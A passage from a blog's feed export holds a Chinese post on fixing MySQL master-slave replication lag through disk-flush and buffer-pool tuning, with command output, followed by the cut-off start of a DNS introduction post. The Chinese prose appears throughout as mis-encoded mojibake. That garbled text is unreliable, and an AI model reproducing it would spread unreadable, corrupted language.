class="line">sync_binlog=0</span><br><span class="line">innodb_flush_log_at_trx_commit=2</span><br></pre></td></tr></table></figure><p>9.é‡å¯mysqlæœåŠ¡,é‡å¯slaveè¿›ç¨‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@server-6 ~]# service mysqld restart</span><br><span class="line"></span><br><span class="line">[root@server-6 ~]# mysql -uroot -p</span><br><span class="line">Enter password:</span><br><span class="line">mysql&gt; start slave;</span><br><span class="line">Query OK, 0 rows affected, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure><p>10.æŸ¥çœ‹å‚æ•°æ˜¯å¦å·²ç»ç”Ÿæ•ˆ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &apos;%sync_bin%&apos;;</span><br><span class="line">+---------------+-------+</span><br><span class="line">| Variable_name | Value |</span><br><span class="line">+---------------+-------+</span><br><span class="line">| sync_binlog   | 0     |</span><br><span class="line">+---------------+-------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like &apos;%innodb_flush%&apos;;</span><br><span class="line">+--------------------------------+-------+</span><br><span class="line">| Variable_name                  | Value |</span><br><span class="line">+--------------------------------+-------+</span><br><span class="line">| innodb_flush_log_at_timeout    | 1     |</span><br><span class="line">| innodb_flush_log_at_trx_commit | 2     |</span><br><span class="line">| innodb_flush_method            |       |</span><br><span class="line">| innodb_flush_neighbors         | 1     |</span><br><span class="line">| innodb_flush_sync              | ON    |</span><br><span class="line">| innodb_flushing_avg_loops      | 30    |</span><br><span class="line">+--------------------------------+-------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>11.ä½†æ˜¯æŸ¥çœ‹ç£ç›˜IOè¿˜æ˜¯å±…é«˜ä¸ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[root@server-6 mysql]# iostat -d -x 2</span><br><span class="line">Linux 3.10.0-693.el7.x86_64 (server-6) 08/20/2018 _x86_64_(56 CPU)</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda               1.06    14.18   80.43 1966.48  6216.32 19621.73    25.25     0.80    0.39   10.68    0.47   0.18  37.31</span><br><span class="line">dm-0              0.00     0.00   80.35 1979.12  6211.59 19615.51    25.08     0.09    0.04    0.60    0.02   0.18  37.33</span><br><span class="line">dm-1              0.00     0.00    1.18    1.55     4.73     6.22     8.00     0.03   11.99    4.65   17.57   0.12   0.03</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda               0.00     0.00   44.50 3126.00  1534.00 67250.50    43.39     3.18    1.10   51.88    0.38   0.31  96.95</span><br><span class="line">dm-0              0.00     0.00   44.00 3126.50  1526.00 67258.50    43.39     3.17    1.10   52.47    0.37   0.31  96.75</span><br><span class="line">dm-1              0.00     0.00    0.00    0.00     0.00     0.00     0.00     0.00    0.00    0.00    0.00   0.00   0.00</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda               0.00     0.00    7.50 3152.50   600.00 51644.00    33.07     2.69    0.87   81.47    0.68   0.30  94.10</span><br><span class="line">dm-0              0.00     0.00    7.50 3152.00   600.00 51636.00    33.07     2.69    0.87   81.47    0.67   0.30  94.00</span><br><span class="line">dm-1              0.00     0.00    0.00    0.00     0.00     0.00     0.00     0.00    0.00    0.00    0.00   0.00   0.00</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda               0.00     0.00   30.00 2915.00  1334.00 53757.25    37.41     3.74    1.27   36.00    0.91   0.30  88.95</span><br><span class="line">dm-0              0.00     0.00   30.50 2915.00  1398.00 53757.25    37.45     3.73    1.27   35.43    0.91   0.30  88.80</span><br><span class="line">dm-1              0.00     0.00    0.00    0.00     0.00     0.00     0.00     0.00    0.00    0.00    0.00   0.00   0.00</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda               0.00     0.00   66.50 3325.00  1656.00 65172.75    39.41     3.91    1.15   46.50    0.24   0.29  99.15</span><br><span class="line">dm-0              0.00     0.00   66.50 3325.00  1600.00 65172.75    39.38     3.90    1.14   46.50    0.24   0.29  99.10</span><br><span class="line">dm-1              0.00     0.00    0.00    0.00     0.00     0.00     0.00     0.00    0.00    0.00    0.00   0.00   0.00</span><br></pre></td></tr></table></figure><p>æ­¤å¤–,å»¶æ—¶ä»ç„¶åœ¨ä¸æ–­çš„ä¸Šå‡,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@server-6 mysql]# /usr/bin/pt-heartbeat --host=127.0.0.1 --user=heartbeat --password=xxxxxx -D dwd_analystic  --master-server-id=63306  --check</span><br><span class="line">94110.00</span><br></pre></td></tr></table></figure><p>12.ä½†æ˜¯æŸ¥çœ‹slaveçŠ¶æ€.ä»ç„¶åœ¨ä¸åœçš„è¯»å–binæ—¥å¿—å’Œlogä¿¡æ¯.ä½†æ˜¯è¯»å–é€Ÿåº¦éå¸¸æ…¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show slave status\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">               Slave_IO_State: Waiting for master to send event</span><br><span class="line">                  Master_Host: 10.81.61.101</span><br><span class="line">                  Master_User: repl</span><br><span class="line">                  Master_Port: 3306</span><br><span class="line">                Connect_Retry: 60</span><br><span class="line">              Master_Log_File: mysql-bin.005029</span><br><span class="line">          Read_Master_Log_Pos: 195990517</span><br><span class="line">               Relay_Log_File: server-6-relay-bin.004900</span><br><span class="line">                Relay_Log_Pos: 983195495</span><br><span class="line">        Relay_Master_Log_File: mysql-bin.004930</span><br><span class="line">             Slave_IO_Running: Yes</span><br><span class="line">            Slave_SQL_Running: Yes</span><br><span class="line">              Replicate_Do_DB: dwd_analystic,hsq_sync_RDS</span><br><span class="line">          Replicate_Ignore_DB:</span><br><span class="line">           Replicate_Do_Table:</span><br><span class="line">       Replicate_Ignore_Table:</span><br><span class="line">      Replicate_Wild_Do_Table:</span><br><span class="line">  Replicate_Wild_Ignore_Table:</span><br><span class="line">                   Last_Errno: 0</span><br><span class="line">                   Last_Error:</span><br><span class="line">                 Skip_Counter: 0</span><br><span class="line">          Exec_Master_Log_Pos: 983195282</span><br><span class="line">              Relay_Log_Space: 106561330708</span><br><span class="line">              Until_Condition: None</span><br><span class="line">               Until_Log_File:</span><br><span class="line">                Until_Log_Pos: 0</span><br><span class="line">           Master_SSL_Allowed: No</span><br><span class="line">           Master_SSL_CA_File:</span><br><span class="line">           Master_SSL_CA_Path:</span><br><span class="line">              Master_SSL_Cert:</span><br><span class="line">            Master_SSL_Cipher:</span><br><span class="line">               Master_SSL_Key:</span><br><span class="line">        Seconds_Behind_Master: 94159</span><br></pre></td></tr></table></figure><p>13.æŸ¥çœ‹mysqlæ•°æ®æ–‡ä»¶çš„binlogæ—¥å¿—æ–‡ä»¶ä¸ªæ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@server-6 mysql]# ls server-6-relay-bin.* | wc -l</span><br><span class="line">301</span><br></pre></td></tr></table></figure><hr><p>14.ä¼˜åŒ–å®Œsyncç£ç›˜å†™å…¥æœºåˆ¶åå‘ç°å»¶æ—¶è¿˜æ˜¯éå¸¸é«˜,è€Œä¸”åœ¨ä¸æ–­ä¸Šå‡,æœ€é«˜çš„æ—¶å€™è¾¾åˆ°äº†34ä¸ªå°æ—¶.slaveè¯»å–binlogæ—¥å¿—è¿˜æ˜¯éå¸¸æ…¢.  </p><p>æŸ¥çœ‹ä¸€ä¸‹mysqlæ•°æ®åº“çš„å…³é”®æ€§èƒ½é…ç½®å‚æ•°,å‘ç°æ²¡æœ‰ç»è¿‡ä»»ä½•ä¼˜åŒ–.è¿™æå¤§çš„é™åˆ¶äº†mysqlçš„æ€§èƒ½.</p><p>ç¼–è¾‘my.cnfé…ç½®æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sync_binlog=0</span><br><span class="line">innodb_flush_log_at_trx_commit=2</span><br><span class="line">innodb_buffer_pool_size=100G</span><br><span class="line">innodb_page_cleaners=2</span><br><span class="line">innodb_log_file_size=1G</span><br></pre></td></tr></table></figure><p>é‡å¯mysqlæœåŠ¡,å¯åŠ¨slaveè¿›ç¨‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service mysqld restart</span><br><span class="line">mysql -uroot -p</span><br><span class="line">mysql&gt; start slave;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯ä¿®æ”¹è¿‡åçš„éƒ¨åˆ†é…ç½®å‚æ•°:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#ä¸‹é¢çš„å‚æ•°æ˜¯æœ€å…³é”®çš„æ€§èƒ½æŒ‡æ ‡.é»˜è®¤å€¼æ˜¯148M.ä¸€èˆ¬å»ºè®®æ˜¯æœåŠ¡å™¨å†…å­˜çš„70%-75%</span><br><span class="line">ç”±äºæˆ‘æœåŠ¡å™¨æ˜¯189Gçš„å†…å­˜,è€ƒè™‘åˆ°å…¶ä»–è€—å†…å­˜çš„è¿›ç¨‹,æ‰€ä»¥è®¾ç½®ä¸º100G</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like &quot;innodb_buffer_pool_size%&quot;;</span><br><span class="line">+-------------------------+--------------+</span><br><span class="line">| Variable_name           | Value        |</span><br><span class="line">+-------------------------+--------------+</span><br><span class="line">| innodb_buffer_pool_size | 107374182400 |</span><br><span class="line">+-------------------------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">#Instanceså‚æ•°å’Œä¸Šé¢çš„pool_sizeç›¸å…³è”.è¿™ä¸ªæ˜¯è‡ªåŠ¨è®¾ç½®çš„.</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like &quot;innodb_buffer_pool_instances&quot;;</span><br><span class="line">+------------------------------+-------+</span><br><span class="line">| Variable_name                | Value |</span><br><span class="line">+------------------------------+-------+</span><br><span class="line">| innodb_buffer_pool_instances | 8     |</span><br><span class="line">+------------------------------+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">#ä¸‹é¢æ˜¯æ—¥å¿—çš„å‚æ•°.log_file_sizeå®šä¹‰äº†æ—¥å¿—æ–‡ä»¶çš„å¤§å°,è¿™ä¸ªå€¼è°ƒé«˜ä¸ºå¥½</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like &quot;innodb_log_file%&quot;;</span><br><span class="line">+---------------------------+------------+</span><br><span class="line">| Variable_name             | Value      |</span><br><span class="line">+---------------------------+------------+</span><br><span class="line">| innodb_log_file_size      | 1073741824 |</span><br><span class="line">| innodb_log_files_in_group | 2          |</span><br><span class="line">+---------------------------+------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>æœ‰å…³mysqlçš„å‚æ•°çš„é…ç½®å’Œä¼˜åŒ–.è¯·å‚è€ƒmysqlçš„å®˜æ–¹æ–‡æ¡£:<a href="https://dev.mysql.com/doc/refman/5.7/en/server-option-variable-reference.html" target="_blank" rel="noopener">Server Option, System Variable, and Status Variable Reference</a></p><hr><p>æ­¤æ—¶,è™½ç„¶å»¶æ—¶è¿˜åœ¨ä¸Šæ¶¨.ä½†æ˜¯slaveè¯»å–binlogæ—¥å¿—çš„é€Ÿåº¦æ˜æ˜¾å¿«äº†å¾ˆå¤š,ç›¸æ¯”ä¹‹å‰åŒæ­¥é€Ÿåº¦å‡ ä¹æ˜¯æŒ‡æ•°çº§çš„ç¿»å€ä¸Šæ¶¨.æ€§èƒ½å¤§å¹…æå‡.è€Œä¸”ä»åº“ä¸Šçš„binlogæ—¥å¿—æ–‡ä»¶åœ¨ä¸æ–­å‡å°‘.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Binlogæ–‡ä»¶ä»300å¤šä¸ªåœ¨é€æ¸å‡å°‘:</span><br><span class="line">[root@server-6 ~]# ls /data/mysql/server-6-relay-bin.*  | wc -l</span><br><span class="line">243</span><br></pre></td></tr></table></figure></p><p>è§‚å¯Ÿäº†1å¤©ä¹‹å,æ—¥å¿—æ–‡ä»¶è¿›ä¸€æ­¥å‡å°‘,è€Œä¸”å»¶æ—¶åœ¨ä¸æ–­çš„æœ€è¿‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@server-6 ~]# /usr/bin/pt-heartbeat --host=127.0.0.1 --user=heartbeat --password=xxxx -D dwd_analystic  --master-server-id=63306  --check</span><br><span class="line">124563.00</span><br><span class="line">[root@server-6 ~]# /usr/bin/pt-heartbeat --host=127.0.0.1 --user=heartbeat --password=xxxx -D dwd_analystic  --master-server-id=63306  --check</span><br><span class="line">124547.00</span><br><span class="line">[root@server-6 ~]# /usr/bin/pt-heartbeat --host=127.0.0.1 --user=heartbeat --password=xxxx -D dwd_analystic  --master-server-id=63306  --check</span><br><span class="line">124532.00</span><br><span class="line">[root@server-6 ~]# ls /data/mysql/server-6-relay-bin.*  | wc -l</span><br><span class="line">183</span><br></pre></td></tr></table></figure><p>å†è§‚å¯Ÿä¸€ä¸ªæ™šä¸Šå,å»¶æ—¶æ•…éšœæ¶ˆå¤±,ä¸»ä»æ¢å¤æ­£å¸¸.binlogæ–‡ä»¶å‡ ä¹è¯»å®Œäº†.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@server-6 ~]# ls /data/mysql/server-6-relay-bin.*  | wc -l</span><br><span class="line">3</span><br><span class="line">[root@server-6 ~]# /usr/bin/pt-heartbeat --host=127.0.0.1 --user=heartbeat --password=xxxx -D dwd_analystic  --master-server-id=63306  --check</span><br><span class="line">1.00</span><br></pre></td></tr></table></figure><p>å¥‡æ€ªçš„æ˜¯ç£ç›˜çš„IOè´Ÿè½½è¿˜æ˜¯éå¸¸é«˜:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@server-6 ~]# iostat -d -x 2</span><br><span class="line">Linux 3.10.0-693.el7.x86_64 (server-6) 08/22/2018 _x86_64_(56 CPU)</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda               3.05    18.97   82.57 1959.78  6145.11 20097.05    25.70     0.02    0.01    0.10    0.00   0.19  39.06</span><br><span class="line">dm-0              0.00     0.00   82.12 1972.87  6130.89 20073.49    25.50     0.27    0.13    1.96    0.05   0.19  38.91</span><br><span class="line">dm-1              0.00     0.00    3.55    5.89    14.21    23.56     8.00     0.23   24.24   22.84   25.08   0.79   0.74</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda              55.50    72.50  218.50 1409.50  1272.00 12573.00    17.01     3.45    1.91   13.30    0.15   0.61  99.85</span><br><span class="line">dm-0              0.00     0.00  207.00 1482.00  1018.00 12573.00    16.09     3.25    1.73   12.88    0.18   0.59  99.70</span><br><span class="line">dm-1              0.00     0.00   68.50    0.00   274.00     0.00     8.00     1.21   16.61   16.61    0.00   2.69  18.40</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda              51.50     0.00  144.50 1809.00  1120.00 12491.25    13.94     2.95    1.69   19.88    0.24   0.51  99.80</span><br><span class="line">dm-0              0.00     0.00  136.50 1809.00   866.00 12491.25    13.73     2.63    1.53   18.63    0.24   0.51  99.70</span><br><span class="line">dm-1              0.00     0.00   58.50    0.00   234.00     0.00     8.00     2.47   43.60   43.60    0.00   5.34  31.25</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda              46.00    67.00  186.00 1726.00  1354.00 13791.75    15.84     2.73    1.25   11.63    0.13   0.52  99.50</span><br><span class="line">dm-0              0.00     0.00  179.50 1793.00  1158.00 13791.75    15.16     2.49    1.15   11.18    0.15   0.50  99.45</span><br><span class="line">dm-1              0.00     0.00   53.50    0.00   214.00     0.00     8.00     2.14   21.75   21.75    0.00   4.38  23.45</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ç£ç›˜çš„è¯»å†™é€Ÿåº¦å¹¶ä¸é«˜,è€Œä¸”æ˜¯eså’Œkafkaè¿›ç¨‹åœ¨æ¶ˆè€—ç£ç›˜IO.å¹¶ä¸æ˜¯mysqlè¿›ç¨‹äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Total DISK READ :     131.73 K/s | Total DISK WRITE :   11.93 M/s</span><br><span class="line">Actual DISK READ:     185.77 K/s | Actual DISK WRITE:   16.11 M/s</span><br><span class="line">   TID  PRIO  USER     DISK READ  DISK WRITE  SWAPIN     IO&gt;    COMMAND</span><br><span class="line">   305 be/4 root        0.00 B/s    0.00 B/s  0.00 % 88.69 % [kswapd0]</span><br><span class="line">117157 be/4 hadoop     50.66 K/s    3.38 K/s  0.00 %  8.19 % java -Xmx64G -Xms64G -server -XX:+UseG1GC -~a.Kafka /opt/kafka/config/server.properties</span><br><span class="line">140979 be/4 hadoop      0.00 B/s  118.22 K/s  0.00 %  6.71 % java -Xms24g -Xmx24g -XX:+UseConcMarkSweepG~rg.elasticsearch.bootstrap.Elasticsearch -d</span><br><span class="line">140960 be/4 hadoop      0.00 B/s   50.66 K/s  0.00 %  0.38 % java -Xms24g -Xmx24g -XX:+UseConcMarkSweepG~rg.elasticsearch.bootstrap.Elasticsearch -d</span><br><span class="line">140449 be/4 hadoop      0.00 B/s  148.61 K/s  0.00 %  0.26 % java -Xms24g -Xmx24g -XX:+UseConcMarkSweepG~rg.elasticsearch.bootstrap.Elasticsearch -d</span><br><span class="line">140974 be/4 hadoop      0.00 B/s  138.48 K/s  0.00 %  0.26 % java -Xms24g -Xmx24g -XX:+UseConcMarkSweepG~rg.elasticsearch.bootstrap.Elasticsearch -d</span><br><span class="line">140980 be/4 hadoop      0.00 B/s  141.86 K/s  0.00 %  0.25 % java -Xms24g -Xmx24g -XX:+UseConcMarkSweepG~rg.elasticsearch.bootstrap.Elasticsearch -d</span><br><span class="line">140973 be/4 hadoop      0.00 B/s  145.24 K/s  0.00 %  0.24 % java -Xms24g -Xmx24g -XX:+UseConcMarkSweepG~rg.elasticsearch.bootstrap.Elasticsearch -d</span><br><span class="line">140869 be/4 hadoop      0.00 B/s   43.91 K/s  0.00 %  0.23 % java -Xms24g -Xmx24g -XX:+UseConcMarkSweepG~rg.elasticsearch.bootstrap.Elasticsearch -d</span><br><span class="line">140966 be/4 hadoop      0.00 B/s  179.01 K/s  0.00 %  0.22 % java -Xms24g -Xmx24g -XX:+UseConcMarkSweepG~rg.elasticsearch.bootstrap.Elasticsearch -d</span><br></pre></td></tr></table></figure><hr><p>æ€»ç»“: </p><p>ä¸»ä»å»¶æ—¶æ¯”è¾ƒå…³é”®çš„åœ°æ–¹:</p><p>1.ç¡®ä¿slaveåº“çš„æœåŠ¡å™¨é…ç½®å’Œmasterç›¸å½“,æˆ–è€…æ¯”masteræ›´é«˜.<br>2.ç¡®ä¿ç½‘ç»œå»¶æ—¶è¾ƒä½.<br>3.sync_binlogå’Œinnodb_flush_log_at_trx_commit,è¿™ä¸¤ä¸ªå‚æ•°å†³å®šäº†ç£ç›˜å†™å…¥æœºåˆ¶.å¦‚æœsync_binlogè®¾ç½®ä¸º1.åˆ™æ¯æ¬¡æ“ä½œéƒ½è¦å›å†™åˆ°ç£ç›˜æ—¥å¿—,æå¤§çš„å¢åŠ ç£ç›˜IOè´Ÿè½½å’ŒåŒæ­¥è´Ÿæ‹….<br>4.innodb_buffer_pool_sizeå‚æ•°è°ƒæ•´ä¼šå°†mysqlçš„æ•´ä½“æ€§èƒ½æé«˜åˆ°å¥½å‡ ä¸ªå€æ•°.<br>5.å¦‚æœæ˜¯mysql5.7ä»¥ä¸Šç‰ˆæœ¬,å°½é‡ä½¿ç”¨GTIDä¸»ä»å¤åˆ¶æœºåˆ¶ä»£æ›¿ä¼ ç»Ÿçš„Binlogæœºåˆ¶.å› ä¸ºBinlogçš„sqlçº¿ç¨‹è¿˜æ˜¯å•çº¿ç¨‹å·¥ä½œæ¨¡å¼.<br>6.å®Œå–„çš„ç›‘æ§æœºåˆ¶.å¦‚æœç¬¬ä¸€æ—¶é—´å‘ç°å»¶æ—¶è¾ƒé«˜,å°±è¦å°½æ—©ä»‹å…¥å¤„ç†.</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;mysqlä¸»ä»åŒæ­¥å»¶æ—¶é—®é¢˜&quot;&gt;&lt;a href=&quot;#mysqlä¸»ä»åŒæ­¥å»¶æ—¶é—®é¢˜&quot; class=&quot;headerlink&quot; title=&quot;mysqlä¸»ä»åŒæ­¥å»¶æ—¶é—®é¢˜&quot;&gt;&lt;/a&gt;mysqlä¸»ä»åŒæ­¥å»¶æ—¶é—®é¢˜&lt;/h2&gt;&lt;p&gt;æœ€è¿‘é¢†å¯¼å°†MASTERçš„ä¸»åº“æ¸…ç©ºäº†æœ€è¿‘å‡ ä¸ªæœˆçš„æ•°æ®,è¿›è¡Œäº†å¤§å¹¶å‘çš„æ“ä½œ.è¿™å¯¼è‡´äº†mysqlçš„ä»åº“å»¶æ—¶éå¸¸é«˜çš„é—®é¢˜.zabbixæŠ¥è­¦å¦‚ä¸‹:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://pabkmteb4.bkt.clouddn.com/mysql-monitor.png&quot; alt=&quot;mysql-zabbix&quot;&gt;&lt;/p&gt;
&lt;p&gt;å»¶æ—¶ä¸€ç›´é£™å‡åˆ°23ä¸ªå°æ—¶.&lt;/p&gt;
    
    </summary>
    
      <category term="mysql" scheme="https://jesse.top/categories/mysql/"/>
    
      <category term="mysqlç»´æŠ¤" scheme="https://jesse.top/categories/mysql/mysql%E7%BB%B4%E6%8A%A4/"/>
    
    
      <category term="mysql" scheme="https://jesse.top/tags/mysql/"/>
    
      <category term="mysqlç»´æŠ¤" scheme="https://jesse.top/tags/mysql%E7%BB%B4%E6%8A%A4/"/>
    
  </entry>
  
  <entry>
    <title>DNSä»‹ç»</title>
    <link href="https://jesse.top/2018/08/14/Linux-Service/DNS%E4%BB%8B%E7%BB%8D/"/>
    <id>https://jesse.top/2018/08/14/Linux-Service/DNSä»‹ç»/</id>
    <published>2018-08-14T01:59:58.000Z</published>
    <updated>2018-12-01T14:27:37.288Z</updated>
    
    <content type="html"><![CDATA[<h3 id="DNSä»‹ç»"><a href="#DNSä»‹ç»" class="headerlink" title="DNSä»‹ç»"></a>DNSä»‹ç»</h3><p>IPåœ°å€è™½ç„¶é‡‡ç”¨äº†ååˆ†è®°æ•°æ³•.ä½†æ˜¯å¯¹äºäººè„‘æ¥è¯´è¿˜æ˜¯éå¸¸éš¾ä»¥è®°å¿†,ä½†æ˜¯è®¿é—®äº’è”ç½‘ç½‘ç«™åˆä¸€å®šéœ€è¦IP,ä¸ºäº†åº”å¯¹è¿™ä¸ªé—®é¢˜.æ—©æœŸçš„æ—¶å€™æ˜¯é€šè¿‡hostsæ–‡ä»¶æ¥ç»‘å®šä¸»æœºåå’ŒIPçš„å¯¹åº”å…³ç³»,</p><p>ä½†æ˜¯è¿™ç§æ–¹æ³•å­˜åœ¨éå¸¸å¤šçš„ä¸è¶³,ç‰¹åˆ«æ˜¯IPå’Œä¸»æœºåçš„å¯¹åº”å…³ç³»è¶Šæ¥è¶Šå¤šçš„æ—¶å€™.hostsæ¡£æ¡ˆå®Œå…¨æ— æ³•æ»¡è¶³äººä»¬çš„éœ€æ±‚.è¿™ä¸ªæ—¶å€™,ä¼¯å…‹åˆ©å¤§å­¦å‘å±•å‡ºä¸€å¥—ä¸»æœºåIPå¯¹åº”ç³»ç»Ÿ.ç§°ä¸ºBerkeley Internet Name Domain, BIND  .ä¹Ÿå°±æ˜¯ç›®å‰å…¨ä¸–ç•Œä½¿ç”¨æœ€å¹¿æ³›çš„Domain Name System, DNS </p><a id="more"></a><hr><p>DNSç³»ç»Ÿé‡‡ç”¨æ ‘çŠ¶çš„é˜¶å±‚æ˜¯æ¶æ„,</p><p>æœ€é¡¶ä¸Šæ˜¯root.ä¹Ÿç§°ä¸ºæ 